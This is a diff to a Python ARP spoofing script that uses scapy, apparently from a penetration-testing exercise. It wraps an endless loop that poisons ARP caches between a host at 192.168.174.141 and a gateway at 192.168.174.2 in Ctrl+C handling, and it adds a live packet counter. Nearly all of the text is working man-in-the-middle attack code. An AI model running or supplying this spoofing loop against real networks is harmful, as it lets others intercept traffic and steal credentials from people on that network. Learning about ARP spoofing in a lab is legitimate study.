@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import time
 import scapy.all as scapy
+import sys
 
 
 def get_mac(ip):
@@ -22,9 +23,13 @@ def spoof(target_ip, spoof_ip):
 
 
 sent_packets_count = 0
-while True:
-    spoof("192.168.174.141", "192.168.174.2")
-    spoof("192.168.174.2", "192.168.174.141")
-    sent_packets_count += 2
-    print("[+] Packets Sent: " + str(sent_packets_count))
-    time.sleep(2)
+try:
+    while True:
+        spoof("192.168.174.141", "192.168.174.2")
+        spoof("192.168.174.2", "192.168.174.141")
+        sent_packets_count += 2
+        print("\r[+] Packets Sent: " + str(sent_packets_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ..... Quitting.")
